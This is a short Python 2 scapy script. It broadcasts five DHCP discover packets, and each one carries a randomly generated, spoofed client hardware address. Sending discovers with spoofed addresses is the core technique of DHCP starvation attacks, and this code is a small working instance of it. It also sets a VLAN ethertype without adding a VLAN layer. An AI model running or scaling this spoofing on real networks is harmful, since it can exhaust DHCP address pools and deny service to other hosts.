#!/usr/bin/env python

from scapy.all import *
import random, struct

def raw2str(raw_mac):
  return ":".join(['{:02x}'.format(ord(var)) for var in raw_mac])

def spoofhwr():
  return "".join([struct.pack("B", random.randint(0, 255)) for x in xrange(6)])

def electif():
  iflist = filter(lambda x: re.match(r'(eth|ens)\d+', x), get_if_list())
  return iflist[0] if len(iflist) else sys.exit()

srcif = electif()
spoofer_mac=get_if_hwaddr(srcif)

##HEADER CONSTRUCT
DHCPpacket = Ether(src=spoofer_mac, dst='ff:ff:ff:ff:ff:ff', type=0x8100)/ \
             IP(version=4, ttl=69, proto=17, src='0.0.0.0', dst='255.255.255.255')/ \
             UDP(sport=68, dport=67)/ \
             BOOTP(htype=1, hops=0, xid=105, flags=32768, ciaddr='0.0.0.0', yiaddr='0.0.0.0', siaddr='0.0.0.0', giaddr='0.0.0.0', chaddr="\x00\x00\x00\x00\x00\x00")/ \
             DHCP(options=[("message-type", "discover"), "end"])

for x in xrange(5):
  spoof_chaddr = spoofhwr()
  DHCPpacket[BOOTP].chaddr=spoof_chaddr
  DHCPpacket[BOOTP].xid = x
  print "{}: Sending spoofed BOOTP packet: src: {}, chaddr: {}".format(x, spoofer_mac, raw2str(spoof_chaddr))
  sendp(DHCPpacket, iface=srcif, count=1, verbose=0)
